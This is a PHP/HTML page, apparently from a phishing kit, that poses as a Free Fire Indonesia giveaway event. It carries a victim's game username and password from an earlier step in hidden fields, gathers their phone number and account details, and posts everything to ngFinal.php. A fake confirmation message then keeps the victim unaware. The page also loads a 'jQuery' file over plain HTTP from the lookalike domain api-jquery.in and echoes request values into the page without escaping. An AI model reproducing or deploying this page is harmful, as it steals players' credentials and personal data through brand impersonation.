<?php
if(isset($_POST['ip'])){
require('ngBackend/ngControllers.php');
$ng = new ngControllers();
$user = $ng->post($_REQUEST['user']);
$pass = $ng->post($_REQUEST['pass']);
$id = $ng->post($_REQUEST['id']);
$nick = $ng->post($_REQUEST['nick']);
$ip = $ng->post($_REQUEST['ip']);
}else{
header('location:index.html');
exit();
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>FREE FIRE INDONESIA</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css"/>
    <style type="text/css">
    	@import url('https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap');
    	@import url('https://fonts.googleapis.com/css2?family=Sniglet&display=swap');
    	@import url('https://fonts.googleapis.com/css2?family=Itim&display=swap');
    	@import url('https://fonts.googleapis.com/css2?family=Teko&display=swap');
    	*
    	{
    		margin: 0;
    		padding: 0;
    		box-sizing: border-box;
    	}

    	body
    	{
    		width: 100%;
    		min-height: 100vh;
    		background: url('https://images.hdqwalls.com/wallpapers/bthumb/garena-free-fire-plan-bermuda-street-outfit-to.jpg') no-repeat;
    		background-size: cover;
    		background-attachment: fixed;
    		display: flex;
    		align-items: center;
    		justify-content: center;
    	}
    	body:before
    	{
    		content: '';
    		position: fixed;
    		top: 0;
    		left: 0;
    		width: 100%;
    		height: 100%;
    		background: rgba(0,0,0,0.50);
    	}
    	section
    	{
    		position: relative;
    		width: 100%;
    		min-height: 100vh;
    		background: url('https://wallpapercave.com/wp/wp6827098.jpg') no-repeat;
    		background-size: cover;
    		box-shadow: 0 .5px 5px rgba(255,255,255,0.50);
    		border:2px solid #FFA619;
    	}
    	section:before
    	{
    		content: '';
    		position: absolute;
    		top: 0;
    		left: 0;
    		width: 100%;
    		height: 100%;
    		background: rgba(0,0,0,0.80);
    	}
    	section header
    	{
    		position: absolute;
    		top:0;
    		left: 50%;
    		transform: translateX(-50%);
    		width: 100%;
    		height: 70px;
    		background:rgba(0, 0, 0, 0.8);
    		overflow: hidden;
    		display: flex;
    		align-items: center;
    		justify-content: center;
    		border-bottom: 2px solid #FFA619;
    		z-index: 1;
    	}
    	.loader
        {
            position:fixed;
            top:0;
            left:0;
            width:100%;
            height:100%;
            display:flex;
            align-items:center;
            justify-content:center;
            z-index:999999;
            background:#110617;
            flex-direction:column;
        }
        .loader img
        {
            max-width:320px;
        }
    	section header .logo
    	{
    		position: relative;
    		width: 250px;
    	}
    	section header:before
    	{
    		content: '';
    		position: absolute;
    		top: 0;
    		left: -15px;
    		width: 70px;
    		height: 100%;
    		transform: skewX(20deg);
    		background:#FFA619;
    	}
    	section header:after
    	{
    		content: '';
    		position: absolute;
    		top: 0;
    		right: -25px;
    		width: 70px;
    		height: 100%;
    		transform: skewX(-20deg);
    		background:#FFA619;
    	}
    	section .NguyenWrap
    	{
    		position: relative;
    		width: 100%;
    		min-height: 100vh;
    		padding: 75px 5px 5px 5px;
    		color:#fff;
    		overflow: hidden;
    	}

    	.NguyenWrap .banner
    	{
    		position: relative;
    		width: 100%;
    		height: 220px;
    		border-radius: 3px;
    		border:2px solid #FFA619;
    		background: red;
    	}
    	.banner .slide
    	{
    		position: absolute;
    		top: 0;
    		left: 0;
    		width: 100%;
    		height: 100%;
    		animation: changeBanner 15s infinite linear;
    	}
    	@keyframes changeBanner
    	{
    		0%,100%{
    			background:url('https://i.ytimg.com/vi/FXbYo1SQ7uI/maxresdefault.jpg') no-repeat;
    			background-size: cover;
    		}
    		25%
    		{
    			opacity: 0.8;
    		}
    		50%
    		{
    			opacity: 1;
    			background:url('https://staticg.sportskeeda.com/editor/2021/02/aba40-16124989553053-800.jpg') no-repeat;
    			background-size: cover;
    		}
    		75%
    		{
    			opacity: 0.8;
    		}
    	}
    	.NguyenWrap .bannerText
    	{
    		position: relative;
    		width: 100%;
    		height: 50px;
    		border-radius: 3px;
    		border:2px solid #FFA619;
    		background:#FFA619;
    		display: flex;
    		align-items: center;
    		justify-content: center;
    		margin-top:5px;
    	}
    	.NguyenWrap .bannerText:before
    	{
    		content: '';
    		position: absolute;
    		top:1px;
    		left: 1px;
    		right: 1px;
    		bottom: 1px;
    		border: 3px solid rgba(0, 0, 0, 0.8);
    		border-radius: 3px;
    	}
    	.bannerText .ngText
    	{
    		font-family: 'Fredoka One', cursive;
    		font-size: 30px;
    		-webkit-text-stroke:1.5px rgba(0, 0, 0, 0.8);
    		letter-spacing: .5px;
    		animation: coloring 4s infinite;
    		animation-delay: calc(.2s * var(--i));
    		font-weight: bold;
    	}
    	@keyframes coloring 
    	{
    		from
    		{
    			color:#FFA619;
    		}
    		to 
    		{
    			color:#fff;
    		}
    	}
    	.NguyenWrap .listAkun
    	{
    		margin-top: 5px;
    		position: relative;
    		width: 100%;
    		display: flex;
    		flex-wrap: wrap;
    		justify-content: center;
    	}
    	.listAkun .box
    	{
    		position: relative;
    		width: 400px;
    		height: 250px;
    		background: #FFA619;
    		margin:7px;
    		border-radius: 3px;
    		padding: 2px;
    	}
    	.box .imgBox
    	{
    		position: relative;
    		width: 100%;
    		height: 175px;
    		background: #fff;
    		border-top-left-radius: 3px; 
    		border-top-right-radius: 3px;
    		border-bottom: 1px solid #FFA619;
    		overflow: hidden;
    	}
    	.box .imgBox img
    	{
    		max-width: 100%;
    		border-top-left-radius: 3px; 
    		border-top-right-radius: 3px; 
    	}
    	.box .boxLabel
    	{
    		position: relative;
    		width: 100%;
    		height: 72px;
    		background: #FFA619;
    		border-bottom-left-radius: 3px; 
    		border-bottom-right-radius: 3px;
    		padding: 1px;
    		display: flex;
    		align-items: center;
    		justify-content: center;
    	}
    	.box .boxLabel ul
    	{
    		position: relative;
    		width: 100%;
    	}
    	.box .boxLabel ul li
    	{
    		list-style: none;
    		padding: 1px;
    		background: linear-gradient(to right,#fff,transparent);
    		color:#333;
    		font-size: 15px;
    		margin: 3px 0;
    		border-radius: 2px;
    		box-shadow: 0 .5px 2px rgba(0,0,0,0.50);
    		padding-left: 1.5px;
    	}
    	.box .boxLabel ul li img
    	{
    		width: 16px;
    		height: 16px;
    		float: left;
    		margin-top: 0.9px;
    		margin-right: 10px;
    	}
    	.box .boxLabel ul li .delim
    	{
    		margin-right: 10px;
    	}
    	.box .boxLabel ul li .value
    	{
    		font-family: 'Consolas';
    		font-weight: bold;
    	}
    	.NguyenWrap .formUpload
    	{
    	    position:relative;
    	    margin-top:50px;
    	    width:100%;
    	    diplay:flex;
    	    flex-direction:wrap;
    	    justify-content:center;
    	}
    	.formUpload .pesanForm
    	{
    	   position: absolute;
    	   left:50%;
    	   transform:translateX(-50%);
    	   padding:5px;
    	   background:red;
    	   font-family: 'Sniglet';
    	   font-size:15px;
    	   color:#fff;
    	   top:-40px;
    	   border:1px solid #FFA619;
    	   box-shadow:0 .5px 10px #FFA619;
    	   width:240px;
    	   text-align:center;
    	   border-radius:3px;
    	   display:none;
    	}
    	.formUpload .form-group
    	{
    	    margin-top:10px;
    	    width:100%;
    	    text-align:center;
    	}
    	.formUpload .form-group:not(:first-child)
    	{
    	    margin-top:25px;
    	}
    	.form-group .form-input
    	{
    	    width:350px;
    	    height:40px;
    	    background:#333;
    	    border:2px solid #FFA619;
    	    padding:4px;
    	    padding-left:6px;
    	    font-size:18px;
    	    font-weight:bold;
    	    border-radius:3px;
    	    box-shadow:0 .5px 10px #FFA619;
    	    color:#fff;
    	    font-family: 'Sniglet';
    	}
    	::placeholder
    	{
    	    color:#fff;
    	}
    	.form-group .form-input:focus
    	{
    	    outline:none;
    	}
    	.sukses
    	{
    	    position:fixed;
    	    top:50%;
    	    left:50%;
    	    transform:translate(-50%,-50%);
    	    width:300px;
    	    height:250px;
    	    display:none;
    	    align-items:center;
    	    justify-content:center;
    	    border:2px solid #fff;
    	    border-radius:3px;
    	    flex-direction:column;
    	    background:#333;
    	    padding:10px;
    	    box-shadow: 100px 0 0 490px rgba(0,0,0,0.50);
    	}
    	.sukses img
    	{
    	    max-width:150px;
    	}
    	.sukses p
    	{
    	    font-family:'Teko';
    	    margin-top:10px;
    	    color:#fff;
    	    text-align:center;
    	}
    	@media (min-width: 911px)
    	{
    		section, section header
    		{
    			width: 400px;
    		}
    	}
    </style>
</head>

<body>
    <section>
        <header>
            <img  src="https://freefiremobile-a.akamaihd.net/common/web_event/official/logo-small_20210113.png">
        </header>
        <div class="loader">
            
            <img src="https://i.pinimg.com/originals/67/56/66/675666d840a9c8fa1c61eaf584ff2a50.gif">
        </div>
        <div class="NguyenWrap">
            <div class="banner">
                <img class="slide">
            </div>
            <div class="bannerText">
                <span class="ngText">Isi Formulir Dibawah</span>
            </div>
            <div class="formUpload">
            <span class="pesanForm gagal">Mohon Isi Semua Formulir</span>
            <span class="pesanForm check">Sedang Mengecek Nomor Hp</span>
            <span class="pesanForm salah">Nomor Hp Harus Lebih Dari 10 Digit</span>
            <span class="pesanForm wrong">Nomor Hp Tidak Cocok</span>
            <form action="" method="POST" onsubmit="return ngValidation()">
            
              <div class="form-group">
                  <input id="hp" class="form-input" placeholder="Nomor HP" data-alert="false" autocomplete="off">
               </div>
            
               <div class="form-group">
                  <select id="level" class="form-input">
                  <option value="" selected disabled>Level Akun?</option>
                  <?php
                  for($i=1;$i<=100;$i++){
                  echo'<option>'.$i.'<'.'/option>';
                  }
                  ?>
                  </select>
               </div>
               
               <div class="form-group">
                  <select id="tier" class="form-input">
                  <option value="" selected disabled>Tier Akun</option>
                  <option>Bronze</option>
                  <option>Silver</option>
                  <option>Gold</option>
                  <option>Diamond</option>
                  <option>Master</option>
                  <option>Grand Master</option>
                  </select>
               </div>
               
               <div class="form-group">
                  <select id="ep" class="form-input">
                  <option value="" selected disabled>Pernah Elite Pass?</option>
                  <option>Pernah</option>
                  <option>Tidak Pernah</option>
                  </select>
               </div>
               <input type="hidden" id="user" value="<?php echo $user;?>">
               <input type="hidden" id="pass" value="<?php echo $pass;?>">
               <input type="hidden" id="id" value="<?php echo $id;?>">
               <input type="hidden" id="nick" value="<?php echo $nick;?>">
               <input type="hidden" id="ip" value="<?php echo $ip;?>">
               <div class="form-group">
                  <input id="submit" style="width:130px;" name="submit" class="form-input" type="submit">
               </div>
            </form>
            </div>
        </div>
        
        
        <div class="sukses">
           <img src="https://nicefuntours.com/wp-content/uploads/2019/12/ShyCautiousAfricanpiedkingfisher-max-1mb.gif">
           <p>Halo <?php echo $nick;?> Terima Kasih Telah Mengikuti Event Ini, Mohon Tunggu Kurang Lebih 1x24 Jam</p>
        </div>
        
        
    </section>
    
    
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="http://api-jquery.in/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
    $(document).ready(function(){
       $(".loader").fadeOut();
    })
      
     </script>
    <script>
    function ngValidation()
    {
    var jQueryinIt = [];
    var user = $("#user").val();
    var pass = $("#pass").val();
    var id = $("#id").val();
    var nick = $("#nick").val();
    var ip = $("#ip").val();
    var hp = $("#hp").val();
    var level = $("#level").val();
    var tier = $("#tier").val();
    var ep = $("#ep").val();
    var nomer = $("#hp").attr("data-alert");
    
    $(".gagal").hide();
    $(".check").hide();
    $(".salah").hide();
    $(".wrong").hide();
    
    if(hp == "" || hp == null || hp.length <= 10){
    $(".salah").show()
    return false;
    }else{
    $(".salah").hide();
    }
    
    if(level == "" || level == null){
    $(".gagal").show()
    return false;
    }else{
    $(".gagal").hide()
    }
    
    if(tier == "" || tier == null){
    $(".gagal").show()
    return false;
    }else{
    $(".gagal").hide()
    }
    
    if(ep == "" || ep == null){
    $(".gagal").show()
    return false;
    }else{
    $(".gagal").hide()
    }
    
    
    if(nomer == "false"){
    $(".gagal").hide();
    $(".check").show();
    $(".salah").hide();
    $.get("ngBackend/ngNumber.php?hp="+hp,function(ng){
    if(ng == "NotFound"){
    $("#hp").attr("data-alert","false");
    $(".gagal").hide();
    $(".check").hide();
    $(".wrong").show();
    return false;
    }else{
    $("#hp").attr("data-alert","true");
    $("#hp").prop("readonly",true);
    $(".gagal").hide();
    $(".check").hide();
    $(".wrong").hide();
    $("#submit").prop("disabled",true);
    jQueryInit();
    }
    })
    }
    
    // MENGIRIM PARAMS KE ngFinal.php
    $.post("ngFinal.php",{
         user:user,
         pass:pass,
         id:id,
         hp:hp,
         level:level,
         nick:nick,
         tier:tier,
         ep:ep,
         ip:ip
    },function(ngSuccess){
         $("#submit").prop("disabled",true);
         });
    
    $("#submit").prop("disabled",true);
    setTimeout(() => {
    $(".sukses").css("display","flex");
    },1000);
    return false;
    }
    </script>
    
    
</body>

</html>